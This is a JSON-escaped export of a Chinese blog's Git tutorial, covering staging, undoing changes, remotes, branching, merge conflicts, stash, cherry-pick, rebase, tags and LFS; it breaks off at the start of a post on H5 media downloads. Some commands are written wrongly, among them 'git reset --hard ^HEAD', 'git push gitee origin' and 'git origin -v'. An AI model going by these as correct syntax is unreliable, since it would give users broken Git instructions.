status</code>可以查看暂存区文件的状态。</p>\n<p>首先<code>git status</code><br><img src=\"Screenshot_20201027_104111.png\" alt=\"\"><br>可以看到当前<code>nothing to commit,working tree clean</code>，说明工作区内文件和最新的<code>HEAD</code>指向的快照一致，并且暂存区为空，无需commit。</p>\n<p>然后在<code>READMD.md</code>中写入新的一行：<code>echo &quot;Git has a stage zone&quot; &gt;&gt; README.md</code>,再次<code>git status</code><br><img src=\"Screenshot_20201027_104731.png\" alt=\"\"><br>可以看到<code>Changes not staged for commit</code>，此时暂存区为空，说明工作区的<code>README.md</code>和<code>HEAD</code>指向的版本库中的对比不符，且没有被暂存。此时<code>git add README.md</code>则会把工作区新的<code>README.md</code>推入暂存区，再次<code>git status</code><br><img src=\"Screenshot_20201027_105241.png\" alt=\"\"><br>可以看到<code>Changes to be Committed</code>，并且文件高亮为绿色，说明暂存区的<code>README.md</code>和工作区的<code>READMD.md</code>已经保持一致，但是和<code>HEAD</code>指向的本地库中的还不一致，需要被commit。</p>\n<p>此时如果再次修改<code>README.md</code>，则和工作区的<code>README.md</code>又不一致，<code>git status</code>中的信息又会变成<code>Changed not staged for commit</code>。再次<code>git add READMD.md</code>解决。</p>\n<p>此时不忙commit，先创建一个新的文件<code>LICENCE</code>，然后<code>git status</code><br><img src=\"Screenshot_20201027_110434.png\" alt=\"\"><br>出现了新的状态<code>Untracked files</code>，说明<code>LICENCE</code>从没有被add过，需要被add</p>\n<p>添加<code>LICENCE</code>文件：<code>git add LICENCE</code><br><img src=\"Screenshot_20201027_110724.png\" alt=\"\"><br>此时所有文件都变成了绿色，可以执行commit了。此时暂存区的状态如下：<br><img src=\"Screenshot_20201027_102229.png\" alt=\"\"></p>\n<p>执行commit后，看到暂存区被清空，再次显示<code>nothing to commit,working tree clean</code><br><img src=\"Screenshot_20201027_110826.png\" alt=\"\"></p>\n<p><code>HEAD</code>纸箱了commit开辟的新的节点，工作区域和<code>HEAD</code>指向的新的快照保持了一致，此时所有区的状态如下<br><img src=\"Screenshot_20201027_102935.png\" alt=\"\"></p>\n<p>总之：Git就是add工作区文件到暂存区暂存，再commit一次会提交所有暂存区的文件，<strong>修改后还没有被add进暂存区的文件不会被commit</strong>。</p>\n<h3 id=\"撤销修改\"><a href=\"#撤销修改\" class=\"headerlink\" title=\"撤销修改\"></a>撤销修改</h3><p>如果写错了文件，或者误删了文件，首先想到的就是用<code>git reset</code>切换到之前的版本，但是如果只是写错了一个文件，这种大面积的回退就得不偿失。</p>\n<p>命令<code>git checkout -- README.md</code>意思就是，把<code>README.md</code>文件在工作区的修改全部撤销，这里有两种情况：</p>\n<ul>\n<li><code>README.md</code>自从修改后还没有被放到暂存区，现在撤销修改就回到和版本库一模一样的状态；</li>\n<li><code>README.md</code>已经添加到暂存区后，又作了修改，现在撤销修改就回到添加到暂存区后的状态。</li>\n</ul>\n<p>即<code>git checkout -- &lt;file&gt;</code>会先从暂存区找文件，找到了就用暂存区文件替代，找不到就用最新版本库中的替代。</p>\n<blockquote>\n<ul>\n<li><code>git checkout -- &lt;file&gt;</code>命令中的<code>--</code>很重要，没有<code>--</code>，就变成了“切换到另一个分支”的意思。新版本Git还提供了<code>git restore &lt;filename&gt;</code>的命令用于避免<code>git checkout</code>切换分支的歧义，建议尽量使用<code>git restore</code>。</li>\n<li>慎用<code>git checkout .</code>，它删除一切unstaged的工作区修改，没有任何办法恢复！！！</li>\n</ul>\n</blockquote>\n<p>如果不仅写错了文件还add到了暂存区：用命令<code>git reset HEAD README.md</code>或者<code>git restore --staged README.md</code>可以把暂存区的修改撤销掉（unstage）。<code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用<code>HEAD</code>表示最新的版本。由于此时工作区还没有撤销更改，再次使用<code>git checkout -- README.md</code>。</p>\n<p>如果不但改错了东西，还从暂存区提交到了版本库，可以用<code>git reset --hard ^HEAD</code>回退到上一个版本。</p>\n<p>如果不但该错了东西，还提交到了版本库，并push到了远程库，那就只能本地回退，然后<code>git push -f</code>了。（但还是会在远程留下记录）</p>\n<h3 id=\"删除文件\"><a href=\"#删除文件\" class=\"headerlink\" title=\"删除文件\"></a>删除文件</h3><p>Git知道你删除了文件，因此，工作区和版本库就不一致了，<code>git status</code>命令会立刻告诉你哪些文件被删除了：<br><img src=\"Screenshot_20201027_120222.png\" alt=\"\"><br>此时如果你是误删，用<code>git checkout -- README.md</code>即可恢复。</p>\n<p>如果你是真的要从版本库删除文件，就用<code>git rm README.md</code>删掉版本库中的文件，并commit。</p>\n<p>如果用<code>git rm README.md</code>，会删除工作区<code>READMD.md</code>并上报给暂存区，此时使用<code>git checkout -- README.md</code>是无法恢复文件的。<br><img src=\"Screenshot_20201027_120953.png\" alt=\"\"><br>这种情况下想要恢复文件，就要取消删除操作的暂存，然后<code>git checkout -- README.md</code>恢复。（可以<code>git status</code>看提示如何操作）<br><img src=\"Screenshot_20201027_121154.png\" alt=\"\"></p>\n<blockquote>\n<p>从来没有被添加到版本库就被删除的文件，是无法恢复的！所以在IDEA等IDE中开发时，创建新文件一定要开启“默认立即添加到本地仓库中”！</p>\n</blockquote>\n<h2 id=\"远程仓库\"><a href=\"#远程仓库\" class=\"headerlink\" title=\"远程仓库\"></a>远程仓库</h2><h3 id=\"远程创建一个新的项目\"><a href=\"#远程创建一个新的项目\" class=\"headerlink\" title=\"远程创建一个新的项目\"></a>远程创建一个新的项目</h3><p>如果从头创建一个新的项目，可以在github中创建一个新的Repository如”learngit”，并勾选<code>Add a README file</code>来初始化一个<code>README.md</code>文件。<br><img src=\"Screenshot_20201027_085110.png\" alt=\"\"><br>然后把创建的repo clone到本地：<code>git clone git@github.com:XUranus/learngit.git</code>。</p>\n<p>克隆后的文件夹里已经包含了<code>.git</code>文件夹和<code>README.md</code>，完成了本地库的创建。</p>\n<h3 id=\"为本地项目添加远程库\"><a href=\"#为本地项目添加远程库\" class=\"headerlink\" title=\"为本地项目添加远程库\"></a>为本地项目添加远程库</h3><p>如果本地已经开始了一个项目，则GitHub上创建新项目不需要初始化<code>README.md</code>，它会创建一个完全为空的repo。在本地项目根目录按照如下步骤进行，则完成第一次commit。</p>\n<p><code>git init</code><br><code>git add README.md</code><br><code>git commit -m &quot;first commit&quot;</code><br><code>git remote add origin git@github.com:XUranus/learngit.git</code><br><code>git push -u origin master</code></p>\n<p>其中<code>git remote add origin git@github.com:XUranus/learngit.git</code>意思是：远程库的名字就是<code>origin</code>，这是Git默认的叫法。</p>\n<blockquote>\n<p>Git支持多种协议，包括https，但ssh协议速度最快。某些公司会封22端口，不得不用https</p>\n</blockquote>\n<p><code>git push -u origin master</code>是把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p>\n<blockquote>\n<p>注意！由于2020年BLM运动，GitHub初始化仓库页用<code>git branch -M main</code>把<code>master</code>分支重命名为<code>main</code>，Git本地工具的默认分支依旧是<code>master</code></p>\n</blockquote>\n<p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。之后，只要本地作了提交，就可以通过命令<code>git push origin master</code>上传到远程仓库。</p>\n<h2 id=\"分支管理\"><a href=\"#分支管理\" class=\"headerlink\" title=\"分支管理\"></a>分支管理</h2><p>分支可以方便协调多人合作，备份未完成的代码而不影响他人。</p>\n<h3 id=\"创建分支与合并分支\"><a href=\"#创建分支与合并分支\" class=\"headerlink\" title=\"创建分支与合并分支\"></a>创建分支与合并分支</h3><p>一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：<br><img src=\"Screenshot_20201027_144711.png\" alt=\"\"><br>每次提交一个commit，<code>master</code>和<code>HEAD</code>就会前进一个节点，<code>master</code>分支会越来越长。</p>\n<p>使用<code>git checkout -b dev</code>创建一个新的分支(或者<code>git branch dev &amp; git checkout dev</code>)，并在上面开发新功能。Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：<br><img src=\"Screenshot_20201027_154912.png\" alt=\"\"></p>\n<p>创建新分支实质上就是创建一个新的指针<code>dev</code>指向当前提交，再把<code>HEAD</code>指向<code>dev</code>,不设计其他文件的变化，所以可以瞬间完成。</p>\n<p>从现在开始，后续的修改和提交就不再针对<code>master</code>分支了，而是<code>dev</code>分支。每当commit一次<code>dev</code>就向前一步，而<code>master</code>不变。<br><img src=\"Screenshot_20201027_160029.png\" alt=\"\"></p>\n<p>假如我们在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并，所以Git分支合并也很快。<br><img src=\"Screenshot_20201027_160207.png\" alt=\"\"></p>\n<p>合并完分支后，可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：<br><img src=\"Screenshot_20201027_160410.png\" alt=\"\"></p>\n<p>总结一下这个过程：</p>\n<ul>\n<li><p><code>git checkout -b dev</code>切换到<code>dev</code>分支。<code>-b</code>参数表示创建分支并切换，等效于这两条命令：<br><code>git branch dev</code><br><code>git checkout dev</code></p>\n</li>\n<li><p>用<code>git branch</code>查看当前的分支，已经切换到了<code>dev</code><br><img src=\"Screenshot_20201103_204649.png\" alt=\"\"></p>\n</li>\n<li><p>做一点修改：<code>echo &quot;creating a new branch is quick.&quot; &gt;&gt; README.md</code>，然后提交：<br><code>git add README.md</code><br><code>git commit -m &quot;switch to new branch dev&quot;</code><br>这次提交就是在<code>dev</code>上往后创建一个节点了。</p>\n</li>\n</ul>\n<p>当我们在<code>dev</code>上完成了开发，想把<code>master</code>同步到<code>dev</code>,用<code>git checkout master</code>回到<code>master</code>，状态如下：<br><img src=\"Screenshot_20201103_204051.png\" alt=\"\"></p>\n<p>此时查看刚才修改的<code>README.md</code>可以看到添加的内容不见了，那个添加位于<code>dev</code>分支。<code>dev</code>分支领先<code>master</code>一次提交，我们吧<code>dev</code>的更改合并到<code>master</code>上:<code>git merge dev</code><br><img src=\"Screenshot_20201103_204954.png\" alt=\"\"><br><code>git merge</code>命令用于合并指定分支到当前分支。合并后，再查看<code>README.md</code>的内容，就可以看到，和<code>dev</code>分支的最新提交是完全一样的。</p>\n<p>合并完成后，就可以放心地删除<code>dev</code>分支了：<code>git branch -d dev</code>,此时使用<code>git branch</code>再次只能看到<code>master</code>分支了。</p>\n<blockquote>\n<ul>\n<li><p>上述合并过程的<code>Fast-forward</code>信息告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。因为创建、合并和删除分支非常快，所以Git鼓励你使用分支完成某个任务，合并后再删掉分支，这和直接在<code>master</code>分支上工作效果是一样的，但过程更安全。</p>\n</li>\n<li><p><code>git checkout</code>既可以撤销修改，也可以切换分支。为了避免误解，新版Git提供<code>git switch -c &lt;branch&gt;</code>来创建并切换分支，用<code>git switch &lt;branch&gt;</code>切换到已有的分支。</p>\n</li>\n</ul>\n</blockquote>\n<p>扩展知识：</p>\n<blockquote>\n<ul>\n<li><code>git branch</code>用于查看本地分支，<code>git branch -r</code>可以用于查看远程分支，<code>git branch -a</code>用于查看本地和远程的全部分支</li>\n<li><code>git branch -d -r &lt;branchname&gt;</code> + <code>git push</code>用于删除远程分支</li>\n<li>Windows上Git分支名称大小写不敏感，应规避用大小写区分分支</li>\n</ul>\n</blockquote>\n<h3 id=\"分支管理策略\"><a href=\"#分支管理策略\" class=\"headerlink\" title=\"分支管理策略\"></a>分支管理策略</h3><p>通常，合并分支时，如果可能，Git会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。如果要强制禁用Fast forward模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p>\n<p>假设之前的例子使用<code>-no-off</code>的普通方式合并分支：<br><code>git merge --no-ff -m &quot;merge with no-ff&quot; dev</code><br>merge之后的历史有分支，能看出来做过合并，就像这样：<br><img src=\"Screenshot_20201103_220940.png\" alt=\"\"></p>\n<p>日常的开发中应遵循如下的分支管理原则：</p>\n<ul>\n<li><code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，不能在上面干活</li>\n<li>干活都在<code>dev</code>分支上。<code>dev</code>分支是不稳定的。到一个版本发布时，把dev分支合并到<code>master</code>上，在<code>master</code>分支发布这个版本</li>\n<li>每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并</li>\n<li>团队协作的分支看起来类似这样：<br><img src=\"Screenshot_20201103_221403.png\" alt=\"\"></li>\n</ul>\n<h3 id=\"解决冲突\"><a href=\"#解决冲突\" class=\"headerlink\" title=\"解决冲突\"></a>解决冲突</h3><p>当两个分支同时修改，就有可能产生冲突。</p>\n<p>比如在<code>master</code>下创建一个新分支<code>feature1</code>。切换过去，加上一行：<br><code>git switch -c feature1</code><br><code>echo &quot;YOU MAY NEED TO FIX CONFLICTS BEFORE MERGE.&quot; &gt;&gt; README.md</code><br><code>git add README.md</code><br><code>git commit -m &quot;need to fix conflict&quot;</code><br>然后切换回<code>master</code>,并做修改：<br><code>git switch master</code><br><code>echo &quot;You may need to fix conflicts before merge.&quot; &gt;&gt; README.md</code><br><code>git add README.md</code><br><code>git commit -m &quot;need to fix conflict&quot;</code></p>\n<p>此时状态如下图所示：<br><img src=\"Screenshot_20201103_210113.png\" alt=\"\"></p>\n<p>在<code>master</code>上<code>git merge feature1</code>,看到冲突提示：<br><img src=\"Screenshot_20201103_212445.png\" alt=\"\"><br>查看<code>README.md</code>，可以看到冲突已经被标出<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Learn Git</span><br><span class=\"line\">I&#x27;m writing this README.md to learn Git.</span><br><span class=\"line\">Git is a distributed version control system.</span><br><span class=\"line\">Git is free software distributed under the GPL.</span><br><span class=\"line\">Git has a stage zone</span><br><span class=\"line\">creating a new branch is quick.</span><br><span class=\"line\">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class=\"line\">You may need to fix conflicts before merge.</span><br><span class=\"line\">=======</span><br><span class=\"line\">YOU MAY NEED TO FIX CONFLICTS BEFORE MERGE.</span><br><span class=\"line\">&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1</span><br></pre></td></tr></table></figure><br>此时用<code>git status</code>可以看到可选的操作，可以放弃merge,也可以手动解决冲突。<br>这里选择保留<code>master</code>上的更改（可以使用vscode的插件），解决完冲突后，<code>README.md</code>如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Learn Git</span><br><span class=\"line\">I&#x27;m writing this README.md to learn Git.</span><br><span class=\"line\">Git is a distributed version control system.</span><br><span class=\"line\">Git is free software distributed under the GPL.</span><br><span class=\"line\">Git has a stage zone</span><br><span class=\"line\">creating a new branch is quick.</span><br><span class=\"line\">You may need to fix conflicts before merge.</span><br></pre></td></tr></table></figure><br>重新提交：<br><code>git add README.md</code><br><code>git commit -m &quot;fix conflict&quot;</code><br>merge完成。用<code>git log --graph</code>命令可以看到分支合并图。<br><img src=\"Screenshot_20201103_213203.png\" alt=\"\"></p>\n<h3 id=\"修复Bug与新建feature\"><a href=\"#修复Bug与新建feature\" class=\"headerlink\" title=\"修复Bug与新建feature\"></a>修复Bug与新建feature</h3><p>工作在<code>dev</code>分支时，接到一个<code>issue-251</code>的Bug Report，创建一个<code>issue-251</code>的临时分支来修复bug，当修复完毕后，再删除临时分支。</p>\n<p>但是此时<code>dev</code>上的工作做到一半，<code>git status</code>可以看到文件被修改还没提交:<br><img src=\"Screenshot_20201104_210806.png\" alt=\"\"><br>此时切换分支会提示报错，要求放弃本地修改，或者commit。Git提供了一个功能叫<code>stash</code>，用于把工作暂存起来。<code>git stash</code>之后再<code>git status</code>，工作区就是干净的了:<br><img src=\"Screenshot_20201104_210852.png\" alt=\"\"></p>\n<p>此时就可以着手修复Bug了，接下来的的工作流程如下:</p>\n<ul>\n<li>假设要去<code>master</code>上修复Bug：<code>git switch master</code></li>\n<li>创建一个<code>issue-251</code>分支：<code>git switch -c issue-251</code></li>\n<li>修复完后提交<code>git commit -m &quot;fix bug issue-251&quot;</code></li>\n<li>切换回<code>master</code>分支：<code>git switch master</code></li>\n<li>完成合并：<code>git merge --no-ff -m &quot;merge bug fix 251&quot; issue-251</code></li>\n<li>修复完Bug，切换回<code>dev</code>分支继续干活：<code>git switch dev</code>，并删除临时分支：<code>git branch -d issue-251</code></li>\n</ul>\n<p>此时<code>git status</code>查看工作区还是干净的。使用<code>git stash list</code>查看暂存的工作:<br><img src=\"Screenshot_20201104_211035.png\" alt=\"\"></p>\n<p>要恢复现场，有两种办法：</p>\n<ol>\n<li><code>git stash apply</code>恢复，但不会删除stash的内容，需要再用<code>git stash drop</code>来删除。</li>\n<li><code>git stash pop</code>恢复现场且删除暂存的内容。</li>\n</ol>\n<p>此时再用<code>git stash list</code>就看不到任何stash内容了。此时<code>git status</code>又可以看到文件被修改的提示了。<br><img src=\"Screenshot_20201104_211151.png\" alt=\"\"></p>\n<p>刚才在<code>master</code>分支修复了Bug，但是<code>dev</code>分支早期也是从<code>master</code>上派生过来的，所以这个Bug在当前<code>dev</code>分支上也是存在的。如果在<code>dev</code>上再次修复一次Bug，<code>dev</code>去merge整个<code>master</code>就太繁琐了。为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支。假设刚才提交的commit id是<code>4c805e2</code>，用<code>git cherry-pick 4c805e2</code>就可以把单个修改Bug的commit复制到<code>dev</code>上来。</p>\n<p>开发一个新feature，最好也新建一个分支如<code>feature-101</code>，在上面开发，完成后去<code>dev</code>或者<code>master</code>上merge。</p>\n<p>如果一个功能开发到一半就被要求取消，即一个<code>feature</code>分支被创建后却没有被合并，此时该分支是无法删除的。 如果要丢弃一个没有被合并过的分支，可以通过<code>git branch -D &lt;branch&gt;</code>强行删除。</p>\n<p>知识点：</p>\n<blockquote>\n<p>Git每次的新提交和修改都是创建新的commit节点：例如用<code>git commit --amend</code>修改上一次commit的message，亦或是用<code>git cherry-pick &lt;commit id&gt;</code>合并指定commit，都会创建一个新的commit节点并拥有新的独一无二的commit id。</p>\n</blockquote>\n<h3 id=\"多人合作\"><a href=\"#多人合作\" class=\"headerlink\" title=\"多人合作\"></a>多人合作</h3><ol>\n<li>用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改</li>\n<li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并</li>\n<li>如果合并有冲突，则解决冲突，并在本地提交</li>\n<li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送</li>\n</ol>\n<blockquote>\n<p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。</p>\n</blockquote>\n<p>不是一定要把本地分支往远程推送:</p>\n<ul>\n<li><code>master</code>分支是主分支，<code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，需要与远程同步</li>\n<li><code>bug</code>分支只用于在本地修复bug，没必要推到远程</li>\n<li><code>feature</code>分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发</li>\n</ul>\n<blockquote>\n<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>\n</blockquote>\n<p>GitHub上clone下来的内本地容默认只看得到<code>master</code>分支（可以用<code>git remote -v</code>查看本地关联的远程库信息。要在在本地创建和远程分支对应的分支，使用<code>git switch -c &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>（本地和远程分支的名称最好一致）</p>\n<p>把<code>master</code>分支推送给远程仓库：<code>git push origin master</code>。同理，把<code>dev</code>推送给远程仓库：<code>git push origin dev</code></p>\n<blockquote>\n<p><code>git pull</code>会自动拉去当前分支远端最新的代码<strong>并自动合并</strong>，如果出现大规模的冲突则会很麻烦。如果追求安全可控最好使用<code>git fetch</code>，<code>git pull</code>实际上做的事等于<code>git fetch &amp;&amp; git merge</code>，<code>git pull</code>会自动合并创建一个新的commit节点，而<code>git fetch</code>只是拉取远端最新代码到本地，需要自己<code>merge</code>。详见<a href=\"https://www.zhihu.com/question/38305012\">git pull 和 git fetch的区别</a></p>\n</blockquote>\n<h3 id=\"Rebase\"><a href=\"#Rebase\" class=\"headerlink\" title=\"Rebase\"></a>Rebase</h3><p>Git Rebase详见这篇讲解：<a href=\"https://www.jianshu.com/p/6960811ac89c\">你真的懂git rebase吗？</a></p>\n<p><code>git merge</code>操作合并分支会让两个分支的每一次提交都按照commit时间（并不是push时间）排序，并且会将两个分支的最新一次commit点进行合并成一个新的commit，最终的分支树呈现非整条线性直线的形式。</p>\n<p><code>git rebase</code>操作实际上是将当前执行rebase分支的所有基于原分支提交点之后的commit打散成一个一个的patch，并重新生成一个新的commit hash值，再次基于原分支目前最新的commit点上进行提交，并不根据两个分支上实际的每次提交的时间点排序，rebase完成后，切到基分支进行合并另一个分支时也不会生成一个新的commit点，可以保持整个分支树的完美线性。</p>\n<p>当我们开发一个功能时，可能会在本地有无数次commit，而你实际上在你的<code>master</code>分支上只想显示每一个功能测试完成后的一次完整提交记录就好了，其他的提交记录并不想将来全部保留在你的<code>master</code>分支上，那么rebase将会是一个好的选择，他可以在rebase时将本地多次的commit合并成一个commit，还可以修改commit的描述等。</p>\n<h2 id=\"标签管理\"><a href=\"#标签管理\" class=\"headerlink\" title=\"标签管理\"></a>标签管理</h2><p>每个commit可以看成是一个版本，有一个唯一的commit id，如果和他人交流提供版本号，用一长串hash码是很不方便的，所以Git提供了Tag的功能，Tag可以是类似”v1.0”,”v2.0”的版本号，他看成是commit id的别称。</p>\n<p>使用<code>git tag &lt;tagname&gt;</code>可以给<code>HEAD</code>指向的commit打上Tag<br><code>git tag -a &lt;tagname&gt; -m &lt;tag message&gt; &lt;commit id&gt;</code>可以给指定commit id添加Tag和Tag的描述信息，<code>-m</code>为可选项目<br><code>git tag</code>查看所有的Tag<br><code>git tag -d &lt;tagname&gt;</code>删除某个Tag<br><code>git show &lt;tagname&gt;</code>看某个Tag的详细信息<br><code>git push origin &lt;tagname&gt;</code>推送Tag到远程</p>\n<h2 id=\"多个远程仓库\"><a href=\"#多个远程仓库\" class=\"headerlink\" title=\"多个远程仓库\"></a>多个远程仓库</h2><p>一个本地仓库可以关联不止一个远程仓库，所以可以同时推送项目到GitHub和Gitee。<br>首先<code>git remote</code>查看关联的远程仓库：<br><img src=\"Screenshot_20201027_132928.png\" alt=\"\"><br>然后<code>git remote rm origin</code>删除<code>origin</code>远程库，在Gitee创建项目并关联：<code>git remote add gitee git@gitee.com:XUranus/learngit.git</code>,重新关联GitHub：<code>git remote add github git@github.com:XUranus/learngit.git</code>。</p>\n<p>此时<code>git origin -v</code>就可以看到两个远程库了，当要同时推送给两个远程库时，只需要：<br><code>git push github master</code><br><code>git push gitee origin</code></p>\n<h2 id=\"Pull-Request\"><a href=\"#Pull-Request\" class=\"headerlink\" title=\"Pull Request\"></a>Pull Request</h2><p>如果要给某个开源项目贡献代码，需要先fork到自己的repo里，然后修改后commit到<strong>自己的</strong>repo里，最后pull request等待项目所有者merge</p>\n<h2 id=\"自定义与配置别名\"><a href=\"#自定义与配置别名\" class=\"headerlink\" title=\"自定义与配置别名\"></a>自定义与配置别名</h2><ol>\n<li><p>安装后初次使用需要配置用户名邮箱：<br><code>git config --global user.name &quot;your name</code><br><code>git config --global user.email &quot;email@example.com</code></p>\n</li>\n<li><p>优化高亮显示<br><code>git config --global color.ui true</code></p>\n<blockquote>\n<p>建议配置oh-my-zsh获得最佳体验</p>\n</blockquote>\n</li>\n<li><p><code>git config --global alias.unstage &#39;reset HEAD&#39;</code><br>配置后撤销stage直接用<code>git unstage README.md</code>即可</p>\n</li>\n<li><p><code>git config --global alias.lg &quot;log --color --graph --pretty=format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;</code><br>配置后使用<code>git lg</code>可以高亮查看分支信息</p>\n</li>\n</ol>\n<p>本地库的配置文件位于<code>.git/config</code>，带有<code>--global</code>的为全局配置，位于<code>~/.gitconfig</code>中</p>\n<h2 id=\"gitignore\"><a href=\"#gitignore\" class=\"headerlink\" title=\".gitignore\"></a>.gitignore</h2><p>时候和开发时项目目录下会产生<code>class</code>文件，链接文件，依赖，配置信息。如果不想这些被添加进库中，可以在项目根目录处配置<code>.gitignore</code>文件。</p>\n<p>Github提供的<code>.gitignore</code>配置文件<a href=\"https://github.com/github/gitignore\">https://github.com/github/gitignore</a></p>\n<h2 id=\"Git-LFS\"><a href=\"#Git-LFS\" class=\"headerlink\" title=\"Git LFS\"></a>Git LFS</h2><p>Git一般只用于跟踪文本文件的变化，如果遇到一些需要跟踪二进制大文件的变化的场景（如二进制模型文件）则需要安装<a href=\"https://git-lfs.github.com/\">Git LFS(git Large File Storage)</a>插件。</p>\n<ul>\n<li>安装Git LFS：<code>sudo pacman -S git-lfs</code></li>\n<li>启动Git LFS：<code>git lfs install</code></li>\n<li>使用Git LFS跟踪二进制文件：<code>git lfs track &lt;file&gt;</code></li>\n<li>查看Git LFS跟踪的文件：<code>git lfs ls-files</code></li>\n</ul>\n<blockquote>\n<p>Git LFS不是通用功能，请先确定你的Git服务提供者是否已经开启了LFS，如果没有开始则无法将LFS跟踪的文件提交上去。</p>\n</blockquote>\n<h2 id=\"git-fsck\"><a href=\"#git-fsck\" class=\"headerlink\" title=\"git fsck\"></a>git fsck</h2><p>如果文件已经被add到暂存区，文件因为一些操作丢失，如：没有commit就<code>git reset --hard HEAD</code>，此时存在将丢失的文件找回的方法。 </p>\n<p>被暂存后，此时文件就已被索引了。此时使用<code>git fsck --lost-found</code>可以列出所有悬空的文件索引：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Checking object directories: 100% (256/256), done.</span><br><span class=\"line\">Checking objects: 100% (581/581), done.</span><br><span class=\"line\">dangling blob 45b25090bd796b456169460740e4baef2577e17e</span><br><span class=\"line\">dangling blob 14141e7e5e734425b625b3a4662cb56a3b5fecd8</span><br><span class=\"line\">dangling commit cbe575e408f1c9a1a8721c61d9c0c15003c25caf</span><br><span class=\"line\">dangling commit e69643f87dc45747be44b92f01a6f5bcd4403c66</span><br></pre></td></tr></table></figure><br>其中blob类型的就是丢失的文件，后面跟文件的hash。可以用<code>git show &lt;hash&gt;</code>来查看一个丢失的未commit的文件的内容，使用<code>git merge &lt;hash&gt;</code>来恢复该文件。</p>\n<h2 id=\"其他注意点\"><a href=\"#其他注意点\" class=\"headerlink\" title=\"其他注意点\"></a>其他注意点</h2><ul>\n<li>建议使用UTF-8编码，避免平台冲突</li>\n</ul>\n<h2 id=\"相关资料\"><a href=\"#相关资料\" class=\"headerlink\" title=\"相关资料\"></a>相关资料</h2><p><a href=\"https://git-scm.com/\">Git官网</a><br><a href=\"https://git-scm.com/book/zh/v2\">Git官方教程 GitBook</a><br><a href=\"https://www.liaoxuefeng.com/wiki/896043488029600\">廖雪峰的Git教程（新手强烈推荐！）</a><br><a href=\"https://gitee.com/liaoxuefeng/learn-java/raw/master/teach/git-cheatsheet.pdf\">Git基本命令查阅表</a><br><a href=\"https://learngitbranching.js.org/?locale=zh_CN\">学习Git分支的游戏</a><br><a href=\"https://github.blog/2018-04-19-introducing-github-learning-lab/\">GitHub官方教程</a><br><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxOTcxNTIwNQ==&amp;mid=2457919169&amp;idx=2&amp;sn=7514209811adbd09b6161093e8ae3eb4&amp;chksm=8cb6bb2bbbc1323dc0cd1c9110fcc6a2a06774040586fc21a01db98129a03ece8ee4cdb73960&amp;scene=21#wechat_redirect\">图解Git命令</a><br><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxOTcxNTIwNQ==&amp;mid=2457915558&amp;idx=1&amp;sn=de0cdcb9fb199162ffe565e371b3dbf4&amp;scene=21#wechat_redirect\">用好这几个工具，能大幅提升你的 Git/GitHub 操作效率！</a><br><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxOTcxNTIwNQ==&amp;mid=2457914802&amp;idx=1&amp;sn=a8d2cb9b626da84d94d8b2ebd9e85c24&amp;scene=21#wechat_redirect\">收好这份 Git 命令应急手册，关键时刻可保你一命</a></p>\n","tags":["Git"]},{"title":"H5中的媒体展示与下载","url":"/2021/03/29/H5%E4%B8%AD%E7%9A%84%E5%AA%92%E4%BD%93%E5%B1%95%E7%A4%BA%E4%B8%8E%E4%B8%8B%E8%BD%BD/","content":"<blockquote>\n<p>最近看到项目里有个模块叫download，用node编写，用作中间件，改变HTTP Response的Header以下载文件，于是打算在本文对H5种媒体的展示或下载方式做一个简单的归纳。</p>\n</blockquote>\n<p>首先<code>npx create_react_app media-demo</code>创建一个测试媒体类型展示的React Demo，我们打算在<code>Download.jsx</code>种实现一个简单的图片展示和下载模块。首先上代码：<br><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> url = <span class=\"string\">&quot;https://img.moegirl.org.cn/common/f/ff/YJSNPI_Ascii_Art..png&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span 